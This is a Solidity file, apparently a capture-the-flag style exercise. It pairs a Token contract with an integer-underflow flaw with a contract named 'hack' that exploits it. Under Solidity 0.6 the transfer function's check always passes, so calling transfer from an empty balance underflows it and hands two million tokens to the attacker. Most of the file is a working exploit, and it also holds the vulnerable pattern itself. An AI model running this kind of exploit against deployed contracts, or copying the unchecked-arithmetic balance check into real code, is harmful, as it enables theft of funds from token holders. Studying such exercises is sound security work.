// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract hack {
    address public owner;

    Token private immutable target;

    constructor(address _target ) public {
        owner = msg.sender;
        target = Token(_target);
    }

    function hackToken() public {
        target.transfer(owner, 2000000);
    }
}

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}